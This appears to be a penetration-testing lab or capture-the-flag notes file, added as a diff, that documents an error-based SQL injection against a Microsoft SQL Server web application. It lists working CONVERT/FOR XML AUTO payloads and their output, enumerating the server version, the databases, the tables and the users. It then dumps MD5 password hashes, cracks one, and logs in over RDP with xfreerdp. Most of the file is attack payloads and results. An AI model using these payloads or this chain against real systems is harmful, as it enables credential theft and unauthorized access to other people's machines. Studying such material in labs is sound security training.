@@ -1,0 +1,75 @@
+# Help documents
+https://docs.microsoft.com/en-us/sql/relational-databases/xml/for-xml-sql-server?view=sql-server-ver15
+https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
+
+# 1 found emails
+Support: Support@thinc.local
+Marketing: Marketing@thinc.local 
+
+# 2 found potential SQLi vulnerability (assumption)
+INSERT INTO table_name (username, email) VALUES ('John', 'John@abc.com');
+
+# POC: Due to the the shown error message, we are able to use convert() function to convert a unconvertable string to int to generate a error. As a result, the string will be shown in the message saying it can not be converted.
+# FOR XML AUTO can print more than one value in this case
+payload = "a', (CONVERT(int, @@version))); --"
+# the query looks like:
+INSERT INTO table_name (username, email) VALUES ('a', (CONVERT(int, @@version))); --', 'anything');
+=> Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)
+
+# current db
+payload = "a', convert(int, (select DB_NAME()))); --"
+=> newsletter
+
+# current user
+payload = "a', convert(int, (select user_name()))); --"
+=> webapp
+
+# list databases
+SQL: [SELECT name FROM master..sysdatabases FOR XML AUTO]
+payload = "a', convert(int, (SELECT name FROM master..sysdatabases FOR XML AUTO))); --"
+<master..sysdatabases name="master"/>
+<master..sysdatabases name="tempdb"/>
+<master..sysdatabases name="model"/>
+<master..sysdatabases name="msdb"/>
+<master..sysdatabases name="newsletter"/>
+<master..sysdatabases name="archive"/>
+
+# list tables
+SQL: [SELECT * FROM INFORMATION_SCHEMA.TABLES FOR XML AUTO]
+payload = "a', convert(int, (SELECT * FROM INFORMATION_SCHEMA.TABLES FOR XML AUTO))); --"
+<row TABLE_CATALOG="newsletter" TABLE_SCHEMA="dbo" TABLE_NAME="users" TABLE_TYPE="BASE TABLE"/>
+
+# retrieve user infomation from users table
+SQL: [select * from users FOR XML AUTO]
+payload = "a', convert(int, (select * from users [where user_id=*] FOR XML AUTO))); --"
+<users user_id="0" username="eric" email="eric@thinc.local"/>
+<users user_id="1" username="alice" email="alice@thinc.local"/>
+<users user_id="2" username="pedro" email="pedro@thinc.local"/>
+<users user_id="3" username="admin" email="admin@thinc.local"/>
+
+# list tables
+SQL: [SELECT * FROM archive.information_schema.TABLES FOR XML AUTO]
+payload = "a', convert(int, (SELECT * FROM archive.information_schema.TABLES  FOR XML AUTO))); --"
+<archive.information_schema.TABLES TABLE_CATALOG="archive" TABLE_SCHEMA="dbo" TABLE_NAME="pmanager" TABLE_TYPE="BASE TABLE"/>
+
+# retrieve user infomation from archive table
+SQL: [SELECT * FROM archive..pmanager FOR XML AUTO]
+payload = "a', convert(int, (SELECT * FROM archive..pmanager FOR XML AUTO))); --"
+<archive..pmanager id="0" alogin="ftpadmin" psw="7de6b6f0afadd89c3ed558da43930181"/>
+<archive..pmanager id="1" alogin="webadmin" psw="5b413fe170836079622f4131fe6efa2d"/>
+<archive..pmanager id="2" alogin="administrator" psw="3c744b99b8623362b466efb7203fd182"/>
+<archive..pmanager id="3" alogin="eric" psw="cb2d5be3c78be06d47b697468ad3b33b"/>
+
+# crack password
+ftpadmin		7de6b6f0afadd89c3ed558da43930181:NF
+webadmin		5b413fe170836079622f4131fe6efa2d:NF
+administrator		3c744b99b8623362b466efb7203fd182:NF
+eric			cb2d5be3c78be06d47b697468ad3b33b:sup3rs3cr3t (md5)
+
+# access to the machine
+xfreerdp /u:eric /p:sup3rs3cr3t /v:$IP
+
+
+
+
+
